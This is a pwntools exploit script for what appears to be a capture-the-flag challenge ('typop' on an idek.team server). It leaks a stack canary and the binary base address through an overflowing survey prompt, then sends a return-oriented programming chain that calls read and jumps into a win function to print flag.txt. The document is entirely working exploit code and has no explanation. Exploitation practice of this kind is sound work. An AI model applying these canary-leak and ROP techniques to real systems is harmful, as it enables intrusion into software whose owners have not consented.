from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
# r = exe.process()
# gdb.attach(r, api = True, gdbscript='''
#            b*getFeedback+199
#            ''')

r = remote('typop.chal.idek.team', 1337)

payload = b'a'*7 + b'abca'

exe.sym['pop_rbp'] = 0x0000000000001233
exe.sym['pop2'] = 0x00000000000014d1
exe.sym['pop_rdi'] = 0x00000000000014d3
exe.sym['add'] = 0x4160

r.sendlineafter(b'survey?\n', b'y')
r.sendafter(b'ctf?', payload)
r.recvuntil(b'abc')
out = r.recv(8)
canary = u64(out) - 0x61
print(hex(canary))

payload = b'a'*10 + p64(canary) + b'a'*8
r.sendafter(b'feedback?\n', payload)

payload = b'a'*22 + b'abcd'
r.sendlineafter(b'survey?\n', b'y')
r.sendafter(b'ctf?', payload)
r.recvuntil(b'abcd')
out = r.recv(6)

binary_addr = u64(out + b'\x00'*2)
print(binary_addr)
exe.address = binary_addr - 55 - exe.sym['main']

payload = b'flag.txt' + b'a'*2 + p64(canary) + b'a'*8

payload+=flat(
    exe.sym['pop_rbp'], exe.sym['add'] + 0x4a,
    exe.sym['pop2'], exe.sym['add'], 0,
    exe.sym['read'], exe.sym['win'] + 99
)

r.sendafter(b'feedback?\n', payload)
r.send(b'flag.txt\x00')
print(r.recv())

r.interactive()